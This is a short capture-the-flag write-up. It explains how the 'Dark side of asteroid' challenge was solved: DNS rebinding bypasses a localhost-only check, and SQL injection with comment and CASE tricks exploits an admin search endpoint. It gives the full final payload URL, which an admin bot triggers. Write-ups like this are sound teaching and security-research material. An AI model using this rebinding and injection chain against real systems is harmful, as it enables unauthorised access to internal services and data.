# Writeup <Dark side of asteroid>

1. **Vulnerability:** Accessible at `/internal/admin/search?q=<query>`.
2. There is an IP check that only allows localhost (`127.0.0.1`) to access this endpoint, but it was being blacklisted so we could bypass it by using dns rebinding (cve-2024-24759)
3. it is vulnerable to SQL injection and you could bypass it by using swicth case
4. **Final payload** (placed in the profile URL to trigger via the admin bot): http://make-190.119.176.214-rebind-127.0.0.1-rr.1u.ms:5000/internal/admin/search?q=%25%27/**/AND/**/access_level/**/IN/**/(CASE/**/WHEN/**/1/**/THEN/**/3/**/ELSE/**/2/**/END)--